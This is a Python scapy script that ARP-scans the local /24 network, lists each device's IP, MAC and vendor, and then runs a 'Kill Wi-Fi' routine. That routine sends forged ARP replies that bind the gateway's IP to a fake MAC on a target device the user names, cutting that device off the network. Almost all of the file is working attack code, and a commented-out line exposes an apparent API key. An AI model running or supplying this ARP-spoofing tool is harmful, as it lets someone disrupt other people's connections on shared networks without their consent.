from scapy.all import *
from scapy.layers.l2 import *
from scapy.layers.dot11 import *
from tkinter import *
from mac_vendor_lookup import MacLookup
# ----------------------------------------
import requests
import time
import json
# ----------------------------------------
    # mac = MacLookup()
    # mac.update_vendors()

def scan(yourIP):
    # ARP adalah Protokol yang digunakan untuk menemukan MAC address perangkat di suatu jaringan dengan cara memanfaatkan IP address penerima.
    arp      = ARP(pdst=yourIP) 
    ethernet = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet   = ethernet / arp
    result   = srp(packet, timeout=3, verbose=0)[0]
    client_list = []
    for client in result:
        # vendor = requests.get("https://api.macvendors.com/"+client[1].src).text
        # vendor = requests.get("https://api.macaddress.io/v1?apiKey=at_LlLsdor4YT6g4IBGjgHl8tjz9XUdm&output=json&search="+client[1].src).text
        # vendor_json = json.loads(vendor)
        # print(vendor_json["vendorDetails"]["companyName"])
        # print(client)
        try:
            vendor = MacLookup().lookup(client[1].src)
        except:
            vendor = "Unknown"
        client_list.append({'ip': client[1].psrc, 'mac': client[1].hwsrc, 'vendors': vendor})
    
    # Client List
    print("\n" + "-"*85 + "\n" + "IP" + " " * 18 + "MAC" + " " * 19 + "VENDOR" + "\n" + "-"*85)
    for client in client_list:
        print("{:16}    {:17}     {}".format(client["ip"],client["mac"],client["vendors"]))
    print("-"*85+"\n")
    
    # Router Information
    router_gateway_ip = client_list[0]["ip"]
    router_mac = client_list[0]["mac"]
    
    # Begin Kill Wi-Fi
    kill(router_gateway_ip)
    
def kill(router_gateway_ip):
    while True:
        victim_ip= input("Target IP  : ")
        victim_mac = input("Target Mac : ")
        # 12:34:56:78:9A:BC
        packet = ARP(op=2, psrc=router_gateway_ip, hwsrc="12:34:56:78:9A:BA", pdst=victim_ip, hwdst=victim_mac)
        # while True:
        #     send(packet, verbose=0)
        send(packet, verbose=0)
        print("Target Down")
        ask = input("Add another devices? (y/n) : ")
        if ask=="y":
            continue
        else:
            sys.exit()
    
if __name__ == "__main__":
    # My IP Address & MAC    
    my_IP   = get_if_addr(conf.iface)
    my_macs = get_if_hwaddr(conf.iface)
    print("\nYour IP Address :",my_IP)
    target_ip = input("(you can use your IP or other user IP in the same connection)\nInput IP >> ")
    
    # Begin Scanning
    scan(target_ip+"/24")
    